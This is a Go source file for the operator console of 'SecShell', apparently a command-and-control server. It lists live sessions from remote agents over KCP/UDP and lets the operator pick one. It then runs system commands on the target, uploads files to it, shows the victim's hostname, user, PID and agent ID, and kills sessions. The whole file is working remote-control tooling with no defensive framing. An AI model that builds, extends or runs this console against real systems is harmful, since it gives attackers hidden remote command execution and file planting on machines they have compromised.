package console

import (
	"SecShell/goroutes"
	"SecShell/grumble"
	"SecShell/util"
	"encoding/binary"
	"fmt"
	"github.com/fatih/color"
	"github.com/xtaci/kcp-go/v5"
	"io"
	"os"
)

const (
	Clearln   = "\r\x1b[2K"
	Underline = "\033[4m"
)

var App = grumble.New(&grumble.Config{
	Name:                  "SecShell",
	Description:           "",
	PromptColor:           color.New(),
	HelpSubCommands:       true,
	HelpHeadlineUnderline: true,
	HelpHeadlineColor:     color.New(),
})

// get a session to options

var Sessions *goroutes.Job

func ServiceConsole() {
	App.AddCommand(&grumble.Command{
		Name: "list",
		Help: "list all alive session",
		Run: func(c *grumble.Context) error {
			// list all session
			for _, session := range goroutes.Jobs.All() {
				fmt.Println(session.ID, session.Name, session.Description)
			}
			return nil
		},
	})
	SessionHandle := &grumble.Command{
		Name: "session",
		Help: "use a alive session by id",
		Args: func(a *grumble.Args) {
			a.Int("id", "exec")
		},
		Run: func(c *grumble.Context) error {
			defer func() {
				if Sessions != nil {
					Sessions.Debug = false
				}
			}()
			id := c.Args["id"].Value.(int)
			// get a session to options
			Sessions = goroutes.Jobs.Get(id)
			// judge a session or alive
			if Sessions == nil {
				fmt.Println(fmt.Sprintf(Clearln+"\n[-] 💢 session %d is not available", id))
				fmt.Println()
				return nil
			} else {
				// 占用，session为debug
				c.App.SetPrompt(fmt.Sprintf("%v » ", Sessions.Name))
				// 存活占用，并将会话栏设置
				Sessions.Debug = true
				if c.App.Commands().Get("shell") == nil && c.App.Commands().Get("background") == nil {
					c.App.AddCommand(&grumble.Command{
						Name: "shell",
						Args: func(a *grumble.Args) {
							a.String("command", "system command")
						},
						Help: "exec system command",
						Run: func(c *grumble.Context) error {
							fmt.Println(c.Args["command"].Value)
							Command(Sessions.Conn, c.Args["command"].Value)
							//fmt.Println(c.Args) // 执行系统命令
							return nil
						},
					})
					c.App.AddCommand(&grumble.Command{
						Name: "upload",
						Help: "upload local file to target",
						Args: func(a *grumble.Args) {
							a.String("local", "local path")
							a.String("target", "target path")
						},
						Run: func(c *grumble.Context) error {
							if c.Args["local"].Value.(string) == "" || c.Args["target"].Value.(string) == "" {
								fmt.Println("[*] upload local target")
								return nil
							}
							Upload(Sessions.Conn, c.Args["local"].Value, c.Args["target"].Value)
							return nil
						},
					})
					c.App.AddCommand(&grumble.Command{
						Name: "background",
						Help: "set session in background",
						Run: func(c *grumble.Context) error {
							c.App.SetDefaultPrompt()
							c.App.Commands().Del("background")
							c.App.Commands().Del("shell")
							c.App.Commands().Del("info")
							c.App.Commands().Del("upload")
							Sessions.Debug = false // stop debug session
							return nil
						},
					})
					c.App.AddCommand(&grumble.Command{
						Name: "info",
						Help: "display session information",
						Run: func(c *grumble.Context) error {
							// reflect config.systeminfo struct
							fmt.Println(fmt.Sprintf("["))
							fmt.Println(fmt.Sprintf("  Hostname:%v", Sessions.Info.HostName))
							fmt.Println(fmt.Sprintf("  User ["))
							fmt.Println(fmt.Sprintf("    Name:%v", Sessions.Info.UserName))
							fmt.Println(fmt.Sprintf("    GID:%v", Sessions.Info.UserGID))
							fmt.Println(fmt.Sprintf("  ]"))
							fmt.Println(fmt.Sprintf("  PID:%v", Sessions.Info.PID))
							fmt.Println(fmt.Sprintf("  Arch:%v", Sessions.Info.Architecture))
							fmt.Println(fmt.Sprintf("  Plamform:%v", Sessions.Info.Platform))
							fmt.Println(fmt.Sprintf("  AgentID:%v", Sessions.Info.AgentId))
							fmt.Println(fmt.Sprintf("  ResponseURL:%v", Sessions.Info.ResponseURL))
							fmt.Println(fmt.Sprintf("]"))
							return nil
						},
					})
				}
			}
			return nil
		},
	}
	App.AddCommand(SessionHandle) // add session handle
	App.AddCommand(&grumble.Command{
		Name: "kill",
		Help: "kill a alive session",
		Args: func(a *grumble.Args) {
			a.Int("id", "session id")
		},
		Run: func(c *grumble.Context) error {
			id := c.Args["id"].Value.(int)
			session := goroutes.Jobs.Get(id)
			// 判断会话是否存在，不存在则但打印
			if session == nil {
				fmt.Println(fmt.Sprintf(Clearln+"\n[-] 💢 session %d is not available", id))
				fmt.Println()
				return nil
			}
			// 会话存在，且没有被调试
			if session != nil && session.Debug != true {
				// 为客户端写入退出消息
				exitMsg, _ := util.Packaging([]byte("exit-Conn"))
				session.Conn.Write(exitMsg)
				// 服务端关闭会话
				_ = session.Conn.Close() // close tcp connect
				session = nil
				fmt.Println(fmt.Sprintf(Clearln+"[*] 💥 session %v is killed", id))
				return nil
			}
			return nil
		},
	})
	App.Run()
}

func Command(conn *kcp.UDPSession, args interface{}) {
	message, err := util.Packaging([]byte(fmt.Sprintf("shell %v", args)))
	if err != nil {
		fmt.Println(Clearln+"\n Command is error", err)
		return
	}
	_, _ = conn.Write(message)
}

func Upload(conn *kcp.UDPSession, arg1 interface{}, arg2 interface{}) {
	file, err := os.Open(arg1.(string)) // open local file
	if err != nil {
		fmt.Println(fmt.Sprintf("[*] %v is not avaliable", arg1))
		return
	}
	// 先传输文件名
	filename, err := util.Packaging([]byte(fmt.Sprintf("upload-filename %v", arg2)))
	if err != nil {
		fmt.Println(Clearln+"\n packaging filename is error", err)
		return
	}
	conn.Write(filename) // 传输文件名
	// 获取文件大小
	b := make([]byte, 8)
	fi, err := file.Stat()
	fsize := uint64(fi.Size())
	binary.LittleEndian.PutUint64(b, fsize)
	conn.Write(b)
	fmt.Println()
	fmt.Println("[*] 文件上传中...， 通讯隧道被占用，等待完成回显后在执行命令")
	go func() {
		for {
			buf := make([]byte, 2048)
			//读取文件内容
			n, err := file.Read(buf)
			if err != nil && io.EOF == err {
				fmt.Println(Clearln+"\n[*] 文件传输完成,大小:", fsize)
				//告诉服务端结束文件接收
				_, _ = conn.Write([]byte("finish"))
				return
			}
			_, err = conn.Write(buf[:n])
			if err != nil {
				fmt.Println("[*] 文件上传失败 ...")
				return
			}
		}
	}()
}
